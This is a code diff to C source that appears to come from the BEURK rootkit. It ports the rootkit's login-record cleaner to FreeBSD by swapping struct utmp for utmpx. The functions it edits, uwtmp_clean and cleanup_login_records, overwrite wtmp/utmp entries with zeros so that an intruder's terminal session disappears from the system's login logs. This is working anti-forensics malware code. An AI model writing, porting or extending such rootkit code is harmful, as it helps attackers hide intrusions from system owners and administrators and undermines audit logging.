@@ -21,17 +21,27 @@
 #include <string.h> /* memset() */
 #include <unistd.h> /* lseek(), read(), write(), close() */
 #include <fcntl.h> /* O_RDWR */
-#include <utmp.h> /* struct utmp */
+#ifdef __FreeBSD__
+# include <utmpx.h> /* struct utmpx */
+#else
+# include <utmp.h> /* struct utmp */
+#endif
 #include "beurk.h" /* prototype */
 #include "config.h" /* REAL_OPEN() */
 #include "debug.h" /* DEBUG() */
+
+#ifdef __FreeBSD__
+# define STRUCT_UTMP struct utmpx
+#else
+# define STRUCT_UTMP struct utmp
+#endif
 
 /** hide utmp/wtmp records
  *
  * read each record on file, searching for entries to hide.
  * such records are overidden with zeros.
  */
-static void uwtmp_clean(struct utmp *utmp_entry, const char *pty_name, int fd) {
+static void uwtmp_clean(STRUCT_UTMP *utmp_entry, const char *pty_name, int fd) {
     lseek(fd, 0, SEEK_SET);
 
     while (read(fd, utmp_entry, sizeof(*utmp_entry))) {
@@ -51,7 +61,7 @@ static void uwtmp_clean(struct utmp *utmp_entry, const char *pty_name, int fd) {
 void    cleanup_login_records(const char *pty_name) {
     DEBUG(D_INFO, "called cleanup_login_records()");
 
-    struct utmp     utmp_entry;
+    STRUCT_UTMP     utmp_entry;
     int             fd;
 
     fd = REAL_OPEN(_WTMP_FILE, O_RDWR);
